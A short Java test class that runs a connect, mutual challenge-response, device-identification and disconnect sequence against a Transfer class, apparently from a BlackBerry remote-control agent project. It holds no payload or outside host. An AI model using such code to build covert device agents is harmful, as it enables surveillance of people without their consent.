package com.ht.tests.accessor;

import com.ht.rcs.blackberry.transfer.ProtocolException;
import com.ht.rcs.blackberry.transfer.Transfer;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class TransferAccessor extends Transfer {
	protected static Debug debug = new Debug("TransferAccessor",
           DebugLevel.VERBOSE);
	public TransferAccessor() {
		super();
	}

	public void ChallengeTest() throws ProtocolException {
		boolean ret = connect();
		if (!ret) {
			debug.error("cannot connect");
		}

		debug.trace("send challange");
		sendChallenge();
		getResponse();

		debug.trace("get challange");
		getChallenge();
		sendResponse();

		debug.trace("both challange OK");
		// identificazione
		sendIds();

		debug.trace("disconnect");
		disconnect();
	}
}
